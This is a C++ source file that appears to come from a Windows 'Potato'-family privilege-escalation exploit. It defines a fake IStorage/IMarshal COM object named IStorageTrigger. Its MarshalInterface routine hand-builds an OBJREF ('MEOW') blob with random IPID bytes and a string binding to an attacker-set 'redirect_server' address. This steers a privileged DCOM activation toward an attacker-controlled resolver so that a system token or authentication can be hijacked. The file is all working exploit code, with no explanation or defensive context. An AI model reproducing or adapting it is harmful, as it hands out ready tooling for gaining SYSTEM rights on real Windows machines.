#include "stdafx.h"
#include "IStorageTrigger.h"
#include <string>
#include <wchar.h>
#include <time.h>
extern PCSTR DEF_PORT;
extern char dcom_port[12];
extern char dcom_ip[17];
extern char redirect_server[17];
void GenRandomByte(byte* s, int len)
{

	int k;
	srand(time(NULL));
	for (int i = 0; i < len; ++i) {
		k = 1 + (rand() % static_cast<int>(255 - 1 + 1));
		s[i] = k;
		//printf("k=%d\n", k);
	}


}
IStorageTrigger::IStorageTrigger(IStorage* istg) {
	_stg = istg;
	m_cRef = 1;
	return;
}

HRESULT IStorageTrigger::DisconnectObject(DWORD dwReserved) {
	return 0;
}

HRESULT IStorageTrigger::GetMarshalSizeMax(const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags, DWORD* pSize) {
	*pSize = 1024;
	//printf("IStorageTrigger GetMarshalSizeMax\n");
	return 0;
}

HRESULT IStorageTrigger::GetUnmarshalClass(const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags, CLSID* pCid) {
	CLSIDFromString(OLESTR("{00000306-0000-0000-c000-000000000046}"), pCid);
	//printf("IStorageTrigger GetUnmarshalClass\n");
	return 0;
}

HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
	// Marshalling Port & Ip address of COM Server

	short sec_len = 8;
	//char *ipaddr = dcom_ip;
	char* ipaddr = (char *)redirect_server;
	
	unsigned short str_bindlen = ((strlen(ipaddr)) * 2) + 6;
	unsigned short total_length = (str_bindlen + sec_len) / 2;
	unsigned char sec_offset = str_bindlen / 2;
	/*byte data_0[] = {
		0x4d,0x45,0x4f,0x57,
		0x01,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
		0x00,0x00,0x00,0x00,
		0x01,0x00,0x00,0x00,
		0xcc,0x96,0xec,0x06,0x4a,0xd8,0x03,0x07,
		0xac,0x31,0xce,0x9c,0x02,0x9d,0x53,0x00,
		0x9f,0x93,0x2c,0x04,0xcd,0x54,0xd4,0xef,0x4b,0xbd,0x1c,0x3b,0xae,0x97,0x21,0x45
	};*/

	
	byte data_0[] = { //OBJREF STANDARD
		0x4d,0x45,0x4f,0x57, //MEOW
		0x01,0x00,0x00,0x00, //FLAGS
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
		0x00,0x00,0x00,0x00, //OBJREF STD FLAGS
		0x01,0x00,0x00,0x00, //count
		//0x37,0x2a,0xb2,0xce,0x7c,0xe5,0xcb,0xcf,//OXID
		//0x32,0x11,0xb2,0x3e,0x7c,0x05,0xcb,0x00,//OXID
		//0x31,0xff,0x38,0xe8,0xb2,0x32,0x32,0x46, //OID
		//0x00,0x00,0x00,0x01,0xea,0xf3,0x4a,0x7a,0xa0,0xf2,0xbc,0xe4,0xc3,0x0d,0xa7,0x7e
		//0x17,0x34,0x00,0x00,0xb0,0x17,0x00,0x00,0xb2,0x58,0x99,0xe7,0x61,0xb4,0x1d,0x10 //IPID
	};
	
	byte* dataip;
	
	byte random_ipid[32];
	GenRandomByte(random_ipid, 32);
	int len = strlen(ipaddr) * 2;
	dataip = (byte*)malloc(len);
	for (int i = 0; i < len; i++)
	{
		if (i % 2)
			dataip[i] = *ipaddr++;
		else
			dataip[i] = 0;
	}

	byte data_4[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0xff,
		0xff, 0x00, 0x00, 0x00, 0x00
	};

	byte data_1[4];
	data_1[0] = total_length;
	data_1[1] = 0;
	data_1[2] = sec_offset;
	data_1[3] = 0;


	int size = sizeof(data_0) + sizeof(random_ipid)+sizeof(data_1) + len + 1 + sizeof(data_4);
	byte* marshalbuf = (byte*)malloc(size);
	int r = 0;
	memcpy(&marshalbuf[r], data_0, sizeof(data_0));
	r = sizeof(data_0);
	memcpy(&marshalbuf[r], &random_ipid[0], sizeof(random_ipid));
	r = r + sizeof(random_ipid);

	memcpy(&marshalbuf[r], data_1, sizeof(data_1));
	r = r + sizeof(data_1);
	byte tmp1[] = { 0x07 };
	memcpy(&marshalbuf[r], tmp1, 1);
	r = r + 1;
	memcpy(&marshalbuf[r], dataip, len);
	r = r + len;

	memcpy(&marshalbuf[r], data_4, sizeof(data_4));

	ULONG written = 0;
	pStm->Write(&marshalbuf[0], size, &written);
	free(marshalbuf);
	free(dataip);
	return 0;
}

HRESULT IStorageTrigger::ReleaseMarshalData(IStream* pStm) {
	return 0;
}
HRESULT IStorageTrigger::UnmarshalInterface(IStream* pStm, const IID& riid, void** ppv) {
	*ppv = 0;
	return 0;
}
HRESULT IStorageTrigger::Commit(DWORD grfCommitFlags) {
	_stg->Commit(grfCommitFlags);
	return 0;
}
HRESULT IStorageTrigger::CopyTo(DWORD ciidExclude, const IID* rgiidExclude, SNB snbExclude, IStorage* pstgDest) {
	_stg->CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
	return 0;
}
HRESULT IStorageTrigger::CreateStorage(const OLECHAR* pwcsName, DWORD grfMode, DWORD reserved1, DWORD reserved2, IStorage** ppstg) {
	_stg->CreateStorage(pwcsName, grfMode, reserved1, reserved2, ppstg);
	return 0;
}
HRESULT IStorageTrigger::CreateStream(const OLECHAR* pwcsName, DWORD grfMode, DWORD reserved1, DWORD reserved2, IStream** ppstm) {
	_stg->CreateStream(pwcsName, grfMode, reserved1, reserved2, ppstm);
	return 0;
}
HRESULT IStorageTrigger::DestroyElement(const OLECHAR* pwcsName) {
	_stg->DestroyElement(pwcsName);
	return 0;
}
HRESULT IStorageTrigger::EnumElements(DWORD reserved1, void* reserved2, DWORD reserved3, IEnumSTATSTG** ppenum) {
	_stg->EnumElements(reserved1, reserved2, reserved3, ppenum);
	return 0;
}
HRESULT IStorageTrigger::MoveElementTo(const OLECHAR* pwcsName, IStorage* pstgDest, const OLECHAR* pwcsNewName, DWORD grfFlags) {
	_stg->MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
	return 0;
}
HRESULT IStorageTrigger::OpenStorage(const OLECHAR* pwcsName, IStorage* pstgPriority, DWORD grfMode, SNB snbExclude, DWORD reserved, IStorage** ppstg) {
	_stg->OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, ppstg);
	return 0;
}
HRESULT IStorageTrigger::OpenStream(const OLECHAR* pwcsName, void* reserved1, DWORD grfMode, DWORD reserved2, IStream** ppstm) {
	_stg->OpenStream(pwcsName, reserved1, grfMode, reserved2, ppstm);
	return 0;
}
HRESULT IStorageTrigger::RenameElement(const OLECHAR* pwcsOldName, const OLECHAR* pwcsNewName) {
	return 0;
}
HRESULT IStorageTrigger::Revert() {
	return 0;
}
HRESULT IStorageTrigger::SetClass(const IID& clsid) {
	return 0;
}
HRESULT IStorageTrigger::SetElementTimes(const OLECHAR* pwcsName, const FILETIME* pctime, const FILETIME* patime, const FILETIME* pmtime) {
	return 0;
}
HRESULT IStorageTrigger::SetStateBits(DWORD grfStateBits, DWORD grfMask) {
	return 0;
}
HRESULT IStorageTrigger::Stat(STATSTG* pstatstg, DWORD grfStatFlag) {
	_stg->Stat(pstatstg, grfStatFlag);

	//Allocate from heap because apparently this will get freed in OLE32
	const wchar_t c_s[] = L"hello.stg";

	wchar_t* s = (wchar_t*)CoTaskMemAlloc(sizeof(c_s));
	wcscpy(s, c_s);
	pstatstg[0].pwcsName = s;
	return 0;
}

///////////////////////IUknown Interface
HRESULT IStorageTrigger::QueryInterface(const IID& riid, void** ppvObj) {
	// Always set out parameter to NULL, validating it first.
	if (!ppvObj) {
		//printf("QueryInterface INVALID\n");
		return E_INVALIDARG;
	}
	if (riid == IID_IUnknown)
	{
		*ppvObj = static_cast<IStorageTrigger*>(this);
		//reinterpret_cast<IUnknown*>(*ppvObj)->AddRef();
	}
	else if (riid == IID_IStorage)
	{
		*ppvObj = static_cast<IStorageTrigger*>(this);
	}
	else if (riid == IID_IMarshal)
	{
		*ppvObj = static_cast<IStorageTrigger*>(this);
	}
	else
	{
		*ppvObj = NULL;
		//printf("QueryInterface NOINT\n");
		return E_NOINTERFACE;
	}
	// Increment the reference count and return the pointer.

	return S_OK;

}


ULONG IStorageTrigger::AddRef() {
	m_cRef++;
	return m_cRef;
}

ULONG IStorageTrigger::Release() {
	// Decrement the object's internal counter.
	ULONG ulRefCount = m_cRef--;
	return ulRefCount;
}
